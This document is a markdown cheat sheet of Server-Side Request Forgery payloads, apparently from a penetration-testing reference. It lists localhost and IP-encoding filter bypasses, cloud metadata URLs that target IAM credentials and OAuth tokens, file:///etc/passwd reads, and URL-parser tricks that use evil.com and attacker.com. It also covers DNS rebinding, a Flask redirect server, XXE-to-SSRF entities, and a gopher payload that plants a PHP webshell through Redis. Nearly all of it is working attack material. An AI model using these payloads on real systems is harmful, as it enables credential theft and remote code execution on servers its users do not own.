# SSRF Payloads

Quick reference for Server-Side Request Forgery.

## Localhost Variations

```
http://127.0.0.1
http://localhost
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]
```

## IP Encoding

```bash
# Decimal (127.0.0.1)
http://2130706433/

# Hex
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# Octal
http://0177.0.0.1/
http://017700000001/

# Mixed
http://0x7f.1/
http://0177.1/
http://127.0.0.01/
```

## IPv6 Variations

```
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
```

## DNS Wildcards

```
http://127.0.0.1.nip.io/
http://127-0-0-1.sslip.io/
http://169.254.169.254.nip.io/
http://localtest.me/
http://spoofed.interact.sh/
```

## Cloud Metadata

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (needs token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### GCP

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header required: Metadata: true
```

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

### Metadata IP Encoding

```bash
# Decimal
http://2852039166/

# Hex
http://0xa9fea9fe/

# IPv6
http://[::ffff:169.254.169.254]/
```

## Protocol Handlers

```
file:///etc/passwd
file:///c:/windows/win.ini
dict://localhost:11211/info
gopher://localhost:6379/_INFO
ftp://localhost:21/
sftp://attacker.com/
ldap://localhost:389/%0astats%0aquit
```

## URL Parsing Bypass

```bash
# @ symbol confusion
http://evil.com@127.0.0.1/
http://127.0.0.1@evil.com/
http://user:pass@127.0.0.1/

# Fragment/query
http://evil.com#127.0.0.1
http://127.0.0.1#evil.com
http://evil.com?@127.0.0.1

# Backslash (parser dependent)
http://127.0.0.1\@evil.com/
http://evil.com\.127.0.0.1/

# Null byte
http://127.0.0.1%00@evil.com/
http://evil.com%00.127.0.0.1/
```

## Unicode/Homograph

```bash
# Fullwidth period
http://127。0。0。1/

# Unicode numerals  
http://①②⑦.⓪.⓪.①/

# Homograph localhost
http://lοcalhost/     # Greek 'ο'
http://ⅼocalhost/     # Roman numeral 'ⅼ'
```

## DNS Rebinding

```bash
# Services
http://7f000001.rbndr.us/
http://A.8.8.8.8.1time.127.0.0.1.1time.repeat.rebind.network/

# Attack flow:
# 1. attacker.com → 8.8.8.8 (validation passes)
# 2. attacker.com → 127.0.0.1 (actual request)
```

## Redirect Bypass

```python
# Your server
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/redir')
def redir():
    return redirect('http://127.0.0.1/', code=302)

@app.route('/gopher')
def gopher_redir():
    return redirect('gopher://127.0.0.1:6379/_INFO', code=302)
```

```bash
# Use existing open redirect
https://target.com/redirect?url=http://169.254.169.254/
```

## Path Traversal

```
http://allowed.com/../../internal/
http://allowed.com/..%2f..%2finternal/
http://allowed.com/foo/../internal/
```

## Internal Services

```bash
# Redis
gopher://127.0.0.1:6379/_INFO

# Docker API
http://127.0.0.1:2375/containers/json

# Jenkins
http://127.0.0.1:8080/script

# FastCGI
gopher://127.0.0.1:9000/_...

# Memcached
dict://127.0.0.1:11211/info

# Elasticsearch
http://127.0.0.1:9200/_cat/indices
```

## Gopher Payloads (Redis RCE)

```bash
# Generate with Gopherus
python gopherus.py --exploit redis

# Manual webshell
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$5%0D%0Ashell%0D%0A$31%0D%0A<?php system($_GET['cmd']); ?>%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0ASAVE%0D%0A
```

## XXE → SSRF

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
```

## Common SSRF Sinks

- Image URL parameters
- Webhook URLs
- PDF generators (wkhtmltopdf)
- URL preview/unfurl
- Import from URL
- Proxy/redirect endpoints
- File download by URL
- GraphQL endpoints

---

!!! tip "Bypass Chain"
    `IP encoding` → `DNS wildcard` → `Redirect` → `Protocol smuggling`

---
*See [SSRF chains](../chains/ssrf-to-rce.md) for escalation to RCE.*
